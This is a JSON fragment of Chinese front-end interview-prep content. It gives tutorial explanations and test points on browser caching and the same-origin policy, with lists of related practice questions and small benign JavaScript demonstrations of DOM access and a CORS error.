        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T18:50:25.000Z"
      },
      {
        "exerciseKey": "5b612b6a-3828-4cd9-9de4-b05bb36a4e3d",
        "title": "html和css中的图片加载与渲染规则是什么样的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2021-08-07T03:14:15.000Z",
        "updateAt": "2024-07-22T09:16:56.000Z"
      },
      {
        "exerciseKey": "61b47ff6-9c4d-4fa2-b126-dc5ffff3e7c6",
        "title": "简述 html 页面渲染过程",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T07:08:18.000Z",
        "updateAt": "2024-08-10T21:35:30.000Z"
      },
      {
        "exerciseKey": "9c119d14-fe3b-4f23-9a51-222c50529890",
        "title": "js和css是否阻塞DOM树构建和渲染？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-10T06:50:43.000Z",
        "updateAt": "2024-08-14T10:51:47.000Z"
      },
      {
        "exerciseKey": "d598569e-a03a-4110-bdbc-fd0c9f0ca18d",
        "title": "如何防止 CSS 阻塞渲染？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T23:23:28.000Z"
      }
    ]
  },
  "215": {
    "id": 215,
    "tagId": 20,
    "title": "浏览器的缓存机制",
    "explanation": "一、前言\n----\n\n缓存可以说是性能优化中简单高效的一种优化方式了。一个优秀的缓存策略可以缩短网页请求资源的距离，减少延迟，并且由于缓存文件可以重复利用，还可以减少带宽，降低网络负荷。\n\n对于一个数据请求来说，可以分为发起网络请求、后端处理、浏览器响应三个步骤。浏览器缓存可以帮助我们在第一和第三步骤中优化性能。比如说直接使用缓存而不发起请求，或者发起了请求但后端存储的数据和前端一致，那么就没有必要再将数据回传回来，这样就减少了响应数据。\n\n接下来的内容中我们将通过缓存位置、缓存策略以及实际场景应用缓存策略来探讨浏览器缓存机制。\n\n**如需获取思维导图或想阅读更多优质文章请猛戳[GitHub博客](https://link.juejin.cn/?target=https%3A%2F%2Fgithub.com%2Fljianshu%2FBlog \"https://github.com/ljianshu/Blog\")**\n\n![](https://static.ecool.fun//article/e97ed6fc-a8d2-4ae0-a361-fbe1349c47b0.awebp)\n\n二、缓存位置\n------\n\n从缓存位置上来说分为四种，并且各自有优先级，当依次查找缓存且都没有命中的时候，才会去请求网络。\n\n*   Service Worker\n*   Memory Cache\n*   Disk Cache\n*   Push Cache\n\n### 1.Service Worker\n\nService Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。使用 Service Worker的话，传输协议必须为 HTTPS。因为 Service Worker 中涉及到请求拦截，所以必须使用 HTTPS 协议来保障安全。**Service Worker 的缓存与浏览器其他内建的缓存机制不同，它可以让我们自由控制缓存哪些文件、如何匹配缓存、如何读取缓存，并且缓存是持续性的**。\n\nService Worker 实现缓存功能一般分为三个步骤：首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件，那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存，存在缓存的话就可以直接读取缓存文件，否则就去请求数据。\n\n当 Service Worker 没有命中缓存的时候，我们需要去调用 fetch 函数获取数据。也就是说，如果我们没有在 Service Worker 命中缓存的话，会根据缓存查找优先级去查找数据。但是不管我们是从 Memory Cache 中还是从网络请求中获取的数据，浏览器都会显示我们是从 Service Worker 中获取的内容。\n\n### 2.Memory Cache\n\nMemory Cache 也就是内存中的缓存，主要包含的是当前中页面中已经抓取到的资源,例如页面上已经下载的样式、脚本、图片等。读取内存中的数据肯定比磁盘快,内存缓存虽然读取高效，可是缓存持续性很短，会随着进程的释放而释放。 **一旦我们关闭 Tab 页面，内存中的缓存也就被释放了**。\n\n**那么既然内存缓存这么高效，我们是不是能让数据都存放在内存中呢？** 这是不可能的。计算机中的内存一定比硬盘容量小得多，操作系统需要精打细算内存的使用，所以能让我们使用的内存必然不多。\n\n当我们访问过页面以后，再次刷新页面，可以发现很多数据都来自于内存缓存\n\n![](https://static.ecool.fun//article/b932d941-0a03-4922-a98d-f2b05bc90853.awebp)\n\n内存缓存中有一块重要的缓存资源是preloader相关指令（例如`<link rel=\"prefetch\">`）下载的资源。总所周知preloader的相关指令已经是页面优化的常见手段之一，它可以一边解析js/css文件，一边网络请求下一个资源。\n\n需要注意的事情是，**内存缓存在缓存资源时并不关心返回资源的HTTP缓存头Cache-Control是什么值，同时资源的匹配也并非仅仅是对URL做匹配，还可能会对Content-Type，CORS等其他特征做校验**。\n\n### 3.Disk Cache\n\nDisk Cache 也就是存储在硬盘中的缓存，读取速度慢点，但是什么都能存储到磁盘中，**比之 Memory Cache 胜在容量和存储时效性上**。\n\n在所有浏览器缓存中，Disk Cache 覆盖面基本是最大的。它会根据 HTTP Herder 中的字段判断哪些资源需要缓存，哪些资源可以不请求直接使用，哪些资源已经过期需要重新请求。并且即使在跨站点的情况下，相同地址的资源一旦被硬盘缓存下来，就不会再次去请求数据。绝大部分的缓存都来自 Disk Cache，关于 HTTP 的协议头中的缓存字段，我们会在下文进行详细介绍。\n\n**浏览器会把哪些文件丢进内存中？哪些丢进硬盘中？** 关于这点，网上说法不一，不过以下观点比较靠得住：\n\n*   对于大文件来说，大概率是不存储在内存中的，反之优先\n*   当前系统内存使用率高的话，文件优先存储进硬盘\n\n### 4.Push Cache\n\nPush Cache（推送缓存）是 HTTP/2 中的内容，当以上三种缓存都没有命中时，它才会被使用。**它只在会话（Session）中存在，一旦会话结束就被释放，并且缓存时间也很短暂**，在Chrome浏览器中只有5分钟左右，同时它也并非严格执行HTTP头中的缓存指令。\n\nPush Cache 在国内能够查到的资料很少，也是因为 HTTP/2 在国内不够普及。这里推荐阅读`Jake Archibald`的 [HTTP/2 push is tougher than I thought](https://link.juejin.cn/?target=https%3A%2F%2Fjakearchibald.com%2F2017%2Fh2-push-tougher-than-i-thought%2F \"https://jakearchibald.com/2017/h2-push-tougher-than-i-thought/\") 这篇文章，文章中的几个结论：\n\n*   所有的资源都能被推送，并且能够被缓存,但是 Edge 和 Safari 浏览器支持相对比较差\n*   可以推送 no-cache 和 no-store 的资源\n*   一旦连接被关闭，Push Cache 就被释放\n*   多个页面可以使用同一个HTTP/2的连接，也就可以使用同一个Push Cache。这主要还是依赖浏览器的实现而定，出于对性能的考虑，有的浏览器会对相同域名但不同的tab标签使用同一个HTTP连接。\n*   Push Cache 中的缓存只能被使用一次\n*   浏览器可以拒绝接受已经存在的资源推送\n*   你可以给其他域名推送资源\n\n如果以上四种缓存都没有命中的话，那么只能发起请求来获取资源了。\n\n那么为了性能上的考虑，大部分的接口都应该选择好缓存策略，**通常浏览器缓存策略分为两种：强缓存和协商缓存，并且缓存策略都是通过设置 HTTP Header 来实现的**。\n\n三、缓存过程分析\n--------\n\n浏览器与服务器通信的方式为应答模式，即是：浏览器发起HTTP请求 – 服务器响应该请求，**那么浏览器怎么确定一个资源该不该缓存，如何去缓存呢**？浏览器第一次向服务器发起该请求后拿到请求结果后，将请求结果和缓存标识存入浏览器缓存，**浏览器对于缓存的处理是根据第一次请求资源时返回的响应头来确定的**。具体过程如下图：\n\n![第一次发起HTTP请求](https://static.ecool.fun//article/48c4fe3b-8a65-457c-b39d-16a0f31b0eef.awebp)\n\n由上图我们可以知道：\n\n*   浏览器每次发起请求，都会先在浏览器缓存中查找该请求的结果以及缓存标识\n    \n*   浏览器每次拿到返回的请求结果都会将该结果和缓存标识存入浏览器缓存中\n    \n\n以上两点结论就是浏览器缓存机制的关键，它确保了每个请求的缓存存入与读取，只要我们再理解浏览器缓存的使用规则，那么所有的问题就迎刃而解了，本文也将围绕着这点进行详细分析。为了方便大家理解，这里我们根据是否需要向服务器重新发起HTTP请求将缓存过程分为两个部分，分别是强缓存和协商缓存。\n\n四、强缓存\n-----\n\n**强缓存：不会向服务器发送请求，直接从缓存中读取资源，在chrome控制台的Network选项中可以看到该请求返回200的状态码，并且Size显示from disk cache或from memory cache。强缓存可以通过设置两种 HTTP Header 实现：Expires 和 Cache-Control。**\n\n### 1.Expires\n\n**缓存过期时间，用来指定资源到期的时间，是服务器端的具体的时间点**。也就是说，Expires=max-age + 请求时间，需要和Last-modified结合使用。Expires是Web服务器响应消息头字段，在响应http请求时告诉浏览器在过期时间前浏览器可以直接从浏览器缓存取数据，而无需再次请求。\n\n**Expires 是 HTTP/1 的产物，受限于本地时间，如果修改了本地时间，可能会造成缓存失效**。`Expires: Wed, 22 Oct 2018 08:41:00 GMT`表示资源会在 Wed, 22 Oct 2018 08:41:00 GMT 后过期，需要再次请求。\n\n### 2.Cache-Control\n\n在HTTP/1.1中，Cache-Control是最重要的规则，主要用于控制网页缓存。比如当`Cache-Control:max-age=300`时，则代表在这个请求正确返回时间（浏览器也会记录下来）的5分钟内再次加载资源，就会命中强缓存。\n\nCache-Control 可以在请求头或者响应头中设置，并且可以组合使用多种指令：\n\n![](https://static.ecool.fun//article/bd71fbcd-1aba-47f9-80b1-13fc86ae16b2.awebp)\n\n**public**：**所有内容都将被缓存（客户端和代理服务器都可缓存）**。具体来说响应可被任何中间节点缓存，如 Browser <-- proxy1 <-- proxy2 <-- Server，中间的proxy可以缓存资源，比如下次再请求同一资源proxy1直接把自己缓存的东西给 Browser 而不再向proxy2要。\n\n**private**：**所有内容只有客户端可以缓存**，Cache-Control的默认取值。具体来说，表示中间节点不允许缓存，对于Browser <-- proxy1 <-- proxy2 <-- Server，proxy 会老老实实把Server 返回的数据发送给proxy1,自己不缓存任何数据。当下次Browser再次请求时proxy会做好请求转发而不是自作主张给自己缓存的数据。\n\n**no-cache**：客户端缓存内容，是否使用缓存则需要经过协商缓存来验证决定。表示不使用 Cache-Control的缓存控制方式做前置验证，而是使用 Etag 或者Last-Modified字段来控制缓存。**需要注意的是，no-cache这个名字有一点误导。设置了no-cache之后，并不是说浏览器就不再缓存数据，只是浏览器在使用缓存数据时，需要先确认一下数据是否还跟服务器保持一致。**\n\n**no-store**：所有内容都不会被缓存，即不使用强制缓存，也不使用协商缓存\n\n**max-age**：max-age=xxx (xxx is numeric)表示缓存内容将在xxx秒后失效\n\n**s-maxage**（单位为s)：同max-age作用一样，只在代理服务器中生效（比如CDN缓存）。比如当s-maxage=60时，在这60秒中，即使更新了CDN的内容，浏览器也不会进行请求。max-age用于普通缓存，而s-maxage用于代理缓存。**s-maxage的优先级高于max-age**。如果存在s-maxage，则会覆盖掉max-age和Expires header。\n\n**max-stale**：能容忍的最大过期时间。max-stale指令标示了客户端愿意接收一个已经过期了的响应。如果指定了max-stale的值，则最大容忍时间为对应的秒数。如果没有指定，那么说明浏览器愿意接收任何age的响应（age表示响应由源站生成或确认的时间与当前时间的差值）。\n\n**min-fresh**：能够容忍的最小新鲜度。min-fresh标示了客户端不愿意接受新鲜度不多于当前的age加上min-fresh设定的时间之和的响应。\n\n![cache-control](https://static.ecool.fun//article/264399e9-7522-424a-bf1c-bae4b5762222.awebp)\n\n从图中我们可以看到，我们可以将多个指令配合起来一起使用，达到多个目的。比如说我们希望资源能被缓存下来，并且是客户端和代理服务器都能缓存，还能设置缓存失效时间等等。\n\n### 3.Expires和Cache-Control两者对比\n\n其实这两者差别不大，区别就在于 Expires 是http1.0的产物，Cache-Control是http1.1的产物，**两者同时存在的话，Cache-Control优先级高于Expires**；在某些不支持HTTP1.1的环境下，Expires就会发挥用处。所以Expires其实是过时的产物，现阶段它的存在只是一种兼容性的写法。 强缓存判断是否缓存的依据来自于是否超出某个时间或者某个时间段，而不关心服务器端文件是否已经更新，这可能会导致加载文件不是服务器端最新的内容，**那我们如何获知服务器端内容是否已经发生了更新呢**？此时我们需要用到协商缓存策略。\n\n五、协商缓存\n------\n\n**协商缓存就是强制缓存失效后，浏览器携带缓存标识向服务器发起请求，由服务器根据缓存标识决定是否使用缓存的过程，主要有以下两种情况**：\n\n*   协商缓存生效，返回304和Not Modified\n    \n    ![协商缓存生效](https://static.ecool.fun//article/5d80f576-8bc2-4be9-9d30-644bedeba6c2.awebp)\n    \n*   协商缓存失效，返回200和请求结果\n    \n\n![协商缓存失效](https://static.ecool.fun//article/f52f02b3-fbc0-4811-bfe8-a858410794de.awebp)\n\n协商缓存可以通过设置两种 HTTP Header 实现：Last-Modified 和 ETag 。\n\n### 1.Last-Modified和If-Modified-Since\n\n浏览器在第一次访问资源时，服务器返回资源的同时，在response header中添加 Last-Modified的header，值是这个资源在服务器上的最后修改时间，浏览器接收后缓存文件和header；\n\n```\nLast-Modified: Fri, 22 Jul 2016 01:47:00 GMT\n\n```\n\n浏览器下一次请求这个资源，浏览器检测到有 Last-Modified这个header，于是添加If-Modified-Since这个header，值就是Last-Modified中的值；服务器再次收到这个资源请求，会根据 If-Modified-Since 中的值与服务器中这个资源的最后修改时间对比，如果没有变化，返回304和空的响应体，直接从缓存读取，如果If-Modified-Since的时间小于服务器中这个资源的最后修改时间，说明文件有更新，于是返回新的资源文件和200\n\n![](https://static.ecool.fun//article/3b733c6d-b79d-48e5-bacc-b1edd023ecc0.awebp)\n\n#### 但是 Last-Modified 存在一些弊端：\n\n*   如果本地打开缓存文件，即使没有对文件进行修改，但还是会造成 Last-Modified 被修改，服务端不能命中缓存导致发送相同的资源\n*   因为 Last-Modified 只能以秒计时，如果在不可感知的时间内修改完成文件，那么服务端会认为资源还是命中了，不会返回正确的资源\n\n既然根据文件修改时间来决定是否缓存尚有不足，能否可以直接根据文件内容是否修改来决定缓存策略？所以在 HTTP / 1.1 出现了 `ETag` 和`If-None-Match`\n\n### 2.ETag和If-None-Match\n\n**Etag是服务器响应请求时，返回当前资源文件的一个唯一标识(由服务器生成)，只要资源有变化，Etag就会重新生成**。浏览器在下一次加载资源向服务器发送请求时，会将上一次返回的Etag值放到request header里的If-None-Match里，服务器只需要比较客户端传来的If-None-Match跟自己服务器上该资源的ETag是否一致，就能很好地判断资源相对客户端而言是否被修改过了。如果服务器发现ETag匹配不上，那么直接以常规GET 200回包形式将新的资源（当然也包括了新的ETag）发给客户端；如果ETag是一致的，则直接返回304知会客户端直接使用本地缓存即可。\n\n![ETag和If-None-Match](https://static.ecool.fun//article/53d0d165-d808-417e-857a-2ed53e49e2e7.awebp)\n\n### 3.两者之间对比：\n\n*   首先在精确度上，Etag要优于Last-Modified。\n\nLast-Modified的时间单位是秒，如果某个文件在1秒内改变了多次，那么他们的Last-Modified其实并没有体现出来修改，但是Etag每次都会改变确保了精度；如果是负载均衡的服务器，各个服务器生成的Last-Modified也有可能不一致。\n\n*   第二在性能上，Etag要逊于Last-Modified，毕竟Last-Modified只需要记录时间，而Etag需要服务器通过算法来计算出一个hash值。\n*   第三在优先级上，服务器校验优先考虑Etag\n\n六、缓存机制\n------\n\n**强制缓存优先于协商缓存进行，若强制缓存(Expires和Cache-Control)生效则直接使用缓存，若不生效则进行协商缓存(Last-Modified / If-Modified-Since和Etag / If-None-Match)，协商缓存由服务器决定是否使用缓存，若协商缓存失效，那么代表该请求的缓存失效，返回200，重新返回资源和缓存标识，再存入浏览器缓存中；生效则返回304，继续使用缓存**。具体流程图如下：\n\n![缓存的机制](https://static.ecool.fun//article/acf5df3d-8c00-4a83-8dda-bfef8793f083.awebp)\n\n看到这里，不知道你是否存在这样一个疑问:**如果什么缓存策略都没设置，那么浏览器会怎么处理？**\n\n对于这种情况，浏览器会采用一个启发式的算法，通常会取响应头中的 Date 减去 Last-Modified 值的 10% 作为缓存时间。\n\n七、实际场景应用缓存策略\n------------\n\n### 1.频繁变动的资源\n\n> Cache-Control: no-cache\n\n对于频繁变动的资源，首先需要使用`Cache-Control: no-cache` 使浏览器每次都请求服务器，然后配合 ETag 或者 Last-Modified 来验证资源是否有效。这样的做法虽然不能节省请求数量，但是能显著减少响应数据大小。\n\n### 2.不常变化的资源\n\n> Cache-Control: max-age=31536000\n\n通常在处理这类资源时，给它们的 Cache-Control 配置一个很大的 `max-age=31536000` (一年)，这样浏览器之后请求相同的 URL 会命中强制缓存。而为了解决更新的问题，就需要在文件名(或者路径)中添加 hash， 版本号等动态字符，之后更改动态字符，从而达到更改引用 URL 的目的，让之前的强制缓存失效 (其实并未立即失效，只是不再使用了而已)。 在线提供的类库 (如 `jquery-3.3.1.min.js`, `lodash.min.js` 等) 均采用这个模式。\n\n八、用户行为对浏览器缓存的影响\n---------------\n\n所谓用户行为对浏览器缓存的影响，指的就是用户在浏览器如何操作时，会触发怎样的缓存策略。主要有 3 种：\n\n*   打开网页，地址栏输入地址： 查找 disk cache 中是否有匹配。如有则使用；如没有则发送网络请求。\n*   普通刷新 (F5)：因为 TAB 并没有关闭，因此 memory cache 是可用的，会被优先使用(如果匹配的话)。其次才是 disk cache。\n*   强制刷新 (Ctrl + F5)：浏览器不使用缓存，因此发送的请求头部均带有 `Cache-control: no-cache`(为了兼容，还带了 `Pragma: no-cache`),服务器直接返回 200 和最新内容。\n ",
    "testPoint": "1. **缓存的基本概念**  \n2. **强缓存 vs. 协商缓存**  \n3. **强缓存**：`Cache-Control`、`Expires`  \n4. **协商缓存**：`ETag`、`Last-Modified`  \n5. **缓存优先级**：强缓存 > 协商缓存 > 无缓存  \n6. **缓存的生命周期**  \n7. **缓存控制指令**：`max-age`、`s-maxage`、`no-cache`、`no-store`、`must-revalidate`  \n8. **Cache-Control的常见值及作用**  \n9. **浏览器缓存的类型**：内存缓存、磁盘缓存  \n10. **HTTP请求中的缓存相关头部**：`If-None-Match`、`If-Modified-Since`  \n11. **Service Worker缓存**  \n12. **缓存的影响因素**：请求头、响应头、用户设置等  \n13. **跨域资源缓存问题**：CORS和缓存  \n14. **缓存清除机制**  \n15. **缓存穿透与缓存雪崩问题**  \n16. **CDN与缓存**  \n17. **版本控制和缓存更新策略**  \n",
    "exerciseKeyList": "[\"67bb706f-a325-4e89-9940-05ab3bcf4bf6\",\"ac644e0a-1fbe-4e0a-9f9f-ecc373a13a87\",\"6d437b44-17fe-4e37-b02e-ed7c7ddb2b80\",\"4c33c24c-2e00-49a8-9f70-14c9ed80bf32\",\"7f7e5941-1079-476a-8a62-8ca51879c7ab\",\"b97ddbf9-57fd-493f-888d-1ffb7981f10a\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-12-17T13:58:14.000Z",
    "updateAt": "2025-07-17T15:21:08.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "4c33c24c-2e00-49a8-9f70-14c9ed80bf32",
        "title": "协商缓存中，有了 Last-Modified，为什么还会出现 ETag？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-11T07:34:31.000Z",
        "updateAt": "2021-08-15T15:28:37.000Z"
      },
      {
        "exerciseKey": "67bb706f-a325-4e89-9940-05ab3bcf4bf6",
        "title": "浏览器缓存中 Memory Cache 和 Disk Cache，有什么区别？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-14T23:49:01.000Z"
      },
      {
        "exerciseKey": "6d437b44-17fe-4e37-b02e-ed7c7ddb2b80",
        "title": "从存储位置看，浏览器缓存分为哪几种？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-10T06:32:33.000Z",
        "updateAt": "2024-08-10T17:06:30.000Z"
      },
      {
        "exerciseKey": "7f7e5941-1079-476a-8a62-8ca51879c7ab",
        "title": "强缓存和协商缓存分别是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T04:32:23.000Z",
        "updateAt": "2024-08-10T17:05:23.000Z"
      },
      {
        "exerciseKey": "ac644e0a-1fbe-4e0a-9f9f-ecc373a13a87",
        "title": "浏览器有哪几种缓存，各种缓存的优先级是什么样的？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-30T01:06:05.000Z",
        "updateAt": "2024-08-10T17:07:26.000Z"
      },
      {
        "exerciseKey": "b97ddbf9-57fd-493f-888d-1ffb7981f10a",
        "title": " Http 缓存策略，有什么区别，分别解决了什么问题",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T11:09:09.000Z",
        "updateAt": "2024-07-19T18:17:20.000Z"
      }
    ]
  },
  "216": {
    "id": 216,
    "tagId": 21,
    "title": "浏览器的同源策略",
    "explanation": "\n概述\n--\n\n本文从以下三个问题，循序渐进，一步步拆解，何为浏览器的同源策略和跨域问题：\n\n1.  什么是同源策略和跨域问题？\n2.  怎样才算同源？\n3.  同源策略下会有什么限制？\n\n什么是同源策略和跨域问题？\n-------------\n\n同源政策是 1995 年由 Netscape 公司（就是创造了 JS 的那家网景公司）引入浏览器的一种策略。\n\n想要理解同源策略的话，可以先假设如果没有同源策略会发生什么事情。接下来我们通过一则恐怖故事代入理解一下没有同源策略的世界：\n\n在某个深夜，小明独自一人在家浏览网页，无意间打开了一些特殊网站，而恰巧的是，小明之前刚好打开过某些重要支付平台的网站且还没关闭，这时特殊网站里面可能有一些特殊 JS 脚本，在偷偷获取小明支付平台上的信息，并且偷偷利用了这些信息再结合某些手段，成功把小明支付平台上的钱转走了，小明上完厕所回来后，突然收到支付平台转账成功的短信，然后然后然后瘫坐在地上，泣不成声，仰天长啸，大喊一声：“还我攒了半年的 9.99~”\n\n恐怖故事听完了，我们来先上个概念，什么是同源策略？\n\n[借用 MDN 上的描述](https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy)：\n\n> **同源策略**是一个重要的安全策略，它用于限制一个origin的文档或者它加载的脚本如何能与另一个源的资源进行交互。它能帮助阻隔恶意文档，减少可能被攻击的媒介。\n\n怎么理解这个概念呢？举个栗子，随着汽车数量的上升，现在很多城市都有各种限行政策，就拿广州来说，如果不是 `粤A` 的车牌进入城区的话会有开四停四的限行限制。\n\n同源策略跟汽车限行政策有一点点像，同源策略规定在“同源”下的脚本、文档等资源访问不受限（有点像 `粤A` 牌的汽车在广州内行驶不会被限行），如果不是“同源”则无法互相访问脚本、文档等资源（非 `粤A` 牌的汽车在广州市区内受开四停四政策限制）\n\n理解了同源策略后，对于跨域就很好理解了，同源策略是好，我们也需要同源策略，但有些时候我们确实需要不同源的两个网页互相读取信息，这是就产生了跨域问题。\n\n**额外补充**，同源策略是浏览器的行为，是浏览器的行为，是浏览器的行为（对于这点的解析可以参考：[同源策略下，服务器会收到浏览器的请求吗？](https://blog.csdn.net/l_z_jay/article/details/121431204)）\n\n怎样才算同源？\n-------\n\n所谓“同源”，就是以下三者必须**都相同**：\n\n1.  协议相同\n    *   协议**相同**的两个域名：（都是 `https` 协议）\n        *   `https://juejin.cn`\n        *   `https://juejin.cn`\n    *   协议**不同**的两个域名：（一个是 `http` 协议，一个是 `https` 协议）\n        *   `http://juejin.cn`\n        *   `https://juejin.cn`\n2.  域名相同\n    *   域名**相同**的两个域名：\n        *   `https://juejin.cn`\n        *   `https://juejin.cn`\n    *   域名**不同**的两个域名：（一个是[二级域名](https://help.aliyun.com/document_detail/155782.html#h2-u4EC0u4E48u53EBu5B50u57DFu540D1)，一个是[三级域名](https://help.aliyun.com/document_detail/155782.html#h2-u4EC0u4E48u53EBu5B50u57DFu540D1)）（可能这个是最容易记错的）\n        *   `https://juejin.cn`\n        *   `https://www.juejin.cn`\n3.  端口相同\n    *   端口**相同**的两个域名：\n        *   `https://juejin.cn`\n        *   `https://juejin.cn`\n    *   端口**不同**的两个域名：\n        *   `https://juejin.cn`\n        *   `https://juejin.cn:8081`\n\n再重复一遍，\n\n同协议、同域名、同端口，才算同源\n\n同协议、同域名、同端口，才算同源\n\n同协议、同域名、同端口，才算同源\n\n同源策略下会有什么限制？\n------------\n\n在同源策略下，如果**非同源**，会有以下三个方面的行为受到限制：\n\n1.  DOM\n    *   如果非同源，其 JS 脚本，不能互相对 DOM 进行读写操作\n2.  数据\n    *   如果非同源，不能互相读写 Cookies、LocalStorage、SessionStorage 和 IndexedDB\n3.  网络请求\n    *   如果非同源，不能通过 AJAX 的方式互相发送、接收数据\n\n为了方便理解，接下来我们展开说说这三条规则 ↓↓↓\n\n### 同源下，JS 可以操作 DOM\n\n![](https://static.ecool.fun//article/2c6da479-2008-4baa-b8d0-74f923378ebc.awebp)\n\n如上图，我们在谷歌浏览器上打开 `https://juejin.cn/post/7123120819437322247` 然后打开开发者工具，执行以下 JS 脚本\n\n```\n// 在另外一个窗口上打开 https://juejin.cn/ 并且返回打开的新窗口对象的引用\nvar www = window.open('https://juejin.cn/', '_blank');\n\n// 然后等 https://juejin.cn/ 窗口打开后，还是在上一步的开发者工具中执行：(执行完后会发现，刚通过 window.open 打开的 https://juejin.cn/ 窗口，DOM 中的 body 标签里面的内容直接被隐藏了)\nwww.document.body.style.display = 'none';\n\n// 想要让其重新展示，再执行下面脚本即可：\nwww.document.body.style.display = 'block';\n\n```\n\n上述例子中，虽然分别打开了 `https://juejin.cn/post/7123120819437322247`、`https://juejin.cn/` 两个窗口，但因为他们是同源的，所以 `https://juejin.cn/post/7123120819437322247` 中的 JS 脚本可以操作 `https://juejin.cn/` 中的 DOM。\n\nPS：上述例子都是建立在通过 [window.open()](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/open) 获取到 `https://juejin.cn/` 窗口对象的引用（[window.opener](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/opener)）的前提下进行的。如果只是单纯直接打开两个窗口，没有 window.opener 的话，也是不可以跨窗口操作 DOM 滴 `￣ω￣=`\n\n### 同源下，才能读写 Cookies、LocalStorage、SessionStorage 和 IndexedDB\n\n![](https://static.ecool.fun//article/fef52037-c7eb-4d51-b156-e871cd7ceb26.awebp)\n\n这里先举个反例吧，如上图，随便打开 [developer.mozilla.org/en-US/](https://developer.mozilla.org/en-US/)、[juejin.cn/](https://juejin.cn/ \"https://juejin.cn/\") 两个网页，在各自的开发工具 Application 中就可以看出，如果非同源，是看不到各自的数据的。\n\n相反，如下图，如果是同源的话，就可以互相看到数据\n\n![](https://static.ecool.fun//article/9cf4a197-f7b4-4773-8e29-5d7fc89e60ca.awebp)\n\n### 同源下，可以通过 AJAX 的方式互相发送、接收数据\n\n这里还是举个反例吧，比如，在掘金上爬的这个获取今日推荐的接口（仅作为演示，无恶意调用，各位也不需要恶意调用喔）\n\n```\nfetch(\"https://api.juejin.cn/recommend_api/v1/article/recommend_all_feed?spider=0\", {\n  \"method\": \"POST\",\n});\n\n```\n\n随便打开百度网页，打开谷歌开发者工具，执行上述 JS 脚本，就能看到熟悉的报错：\n\n![](https://static.ecool.fun//article/44164e2b-6824-4b3d-bd95-01ffdb9ab70b.awebp)\n\n```\nhas been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.\n\n```\n\n这个可能是我们经常会遇到的报错信息吧~\n\n由此看出，如果非同源，不能通过 AJAX 的方式互相发送、接收数据；相反，如果同源，则可以通过 AJAX 的方式互相发送、接收数据。",
    "testPoint": "浏览器的同源策略（Same-Origin Policy，SOP）是 Web 安全的基石之一，面试中关于同源策略的考察点非常丰富，涉及原理、限制、跨域解决方案等多个方面。下面是常见的考点整理：\n\n## 一、同源策略的基本概念\n\n* **什么是同源？**\n  两个 URL 的协议（protocol）、域名（host）、端口（port）三者都相同，才算同源。\n\n* **同源策略的目的是什么？**\n  防止恶意脚本窃取或篡改另一个网站的数据，保护用户隐私和安全。\n\n\n## 二、同源策略具体限制的内容\n\n* **DOM 访问限制**\n  脚本无法访问跨源页面的 DOM，如 `iframe` 中的跨源文档。\n\n* **Cookie、LocalStorage、IndexedDB 等存储限制**\n  跨源时无法访问对方的存储空间。\n\n* **AJAX（XHR、fetch）请求限制**\n  只能请求同源资源，否则会被浏览器阻止。\n\n* **WebSocket 限制**\n  建立连接时也受同源限制。\n\n\n## 三、哪些属于“不同源”？\n\n* 协议不同：`http://` 和 `https://`\n* 域名不同：`example.com` 和 `api.example.com`\n* 端口不同：`http://example.com:80` 和 `http://example.com:8080`\n\n## 四、跨域场景与解决方案\n\n### 1. **JSONP**\n\n* 利用 `<script>` 标签不受跨域限制的特点实现跨域请求（仅支持 GET）。\n* 需后端配合返回回调函数。\n\n### 2. **CORS（跨域资源共享）**\n\n* 服务器设置响应头 `Access-Control-Allow-Origin` 等，允许浏览器跨域访问。\n* 预检请求（OPTIONS）机制，复杂请求需要先发预检。\n* 支持带 Cookie 的跨域需设置 `Access-Control-Allow-Credentials`。\n\n### 3. **代理服务器**\n\n* 通过同源的服务器代理请求，实现跨域访问。\n\n### 4. **PostMessage**\n\n* 跨窗口通信（如跨域 iframe），通过 `window.postMessage` 安全传递数据。\n\n### 5. **WebSocket**\n\n* 建立长连接，协议允许跨域，但握手时仍有安全限制。\n\n### 6. **document.domain**\n\n* 设置相同的 `document.domain` 来放宽子域间限制（仅限一级域名相同）。\n\n\n## 五、同源策略与浏览器安全机制\n\n* **浏览器默认阻止跨域访问**\n* **跨域请求携带 Cookie 限制**\n* **浏览器对跨域资源的预检机制**\n* **跨域脚本注入风险防范**\n\n## 六、面试常见问题示例\n\n1. 什么是同源策略？同源的判断条件是什么？\n2. 同源策略限制了哪些操作？\n3. 如何实现跨域请求？请列举几种常见方案，并说明原理。\n4. CORS 中预检请求的作用是什么？哪些请求会触发预检？\n5. JSONP 是什么？它的优缺点有哪些？\n6. 如何使用 `postMessage` 实现跨域通信？\n7. 什么情况下可以使用 `document.domain` 来实现跨域？\n8. 跨域请求携带 Cookie 需要注意什么？\n9. 如何配置服务器支持带凭证的跨域请求？\n10. WebSocket 是否受同源策略限制？为什么？\n",
